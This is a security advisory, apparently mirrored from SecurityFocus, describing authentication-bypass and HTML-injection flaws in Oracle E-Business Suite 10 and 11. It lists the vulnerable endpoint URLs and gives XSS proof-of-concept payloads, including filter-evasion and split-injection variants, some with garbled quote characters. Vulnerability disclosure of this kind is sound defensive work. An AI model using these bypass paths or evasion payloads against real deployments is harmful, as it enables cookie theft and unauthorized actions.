source: https://www.securityfocus.com/bid/37305/info

Oracle E-Business Suite is prone to multiple authentication-bypass and HTML-injection vulnerabilities.

Attackers could exploit these issues to steal cookie-based authentication credentials, perform unauthorized actions, or bypass certain security restrictions. Other attacks are also possible.

Some of these vulnerabilities may be documented in BID 33177 (Oracle January 2009 Critical Patch Update Multiple Vulnerabilities). Reportedly, the HTML-injection and some authentication-bypass vulnerabilities were addressed in the Oracle January 2009 Critical Patch Update. Full details are not currently available. We will update this BID as more information emerges.

Oracle E-Business Suite 10 and 11 are vulnerable; other versions may also be affected.

Authentication bypass:

http://www.example.com:port/OA_HTML/OA.jsp
http://www.example.com:port/OA_HTML/RF.jsp
http://www.example.com:port/pls/[DADName]/oracleconfigure.customize?p_page_id=[page_id]
http://www.example.com:port/pls/[DADName]/icx_define_pages.DispPageDialog?p_mode=RENAME&p_page_id=[page_id]
http://www.example.com:8888/pls/TEST/oracleconfigure.customize?p_page_id=1

HTML injection:

http://www.example.com:port/pls/[DADName]/icx_define_pages.editpagelist
http://www.example.com:port/pls/[DADName]/oracleconfigure.customize?p_page_id=[page_id]
http://www.example.com:port/pls/[DADName]/icx_define_pages.DispPageDialog?p_mode=RENAME&p_page_id=[page_id]
http://www.example.com:port/pls/[DADName]/icx_define_pages.DispPageDialog?p_mode=CREATE

It is important to note that our testing has indicated that different versions have different mitigation levels of this vulnerability, requiring, in some situations, utilizing XSS evasion techniques to overcome certain input validation and sanitation mechanisms:

    * For earlier versions, injecting a simple <SCRIPT> suffices:

      <SCRIPT>alert(ï¿½XSS')<SCRIPT>

    * Some versions limit the permitted characters, and thus require the tester to inset Java-script without utilizing tags, by injecting a script into the text box as follows:

      ");alert('XSS');//

    * Later versions appear to also enforce server-side length restrictions on the vulnerable parameters. As a result, multiple separate injections are required to achieve script execution, such as:

      ");/*

      */alert/*

      */(/*

      */ï¿½XSS'/*

      */);//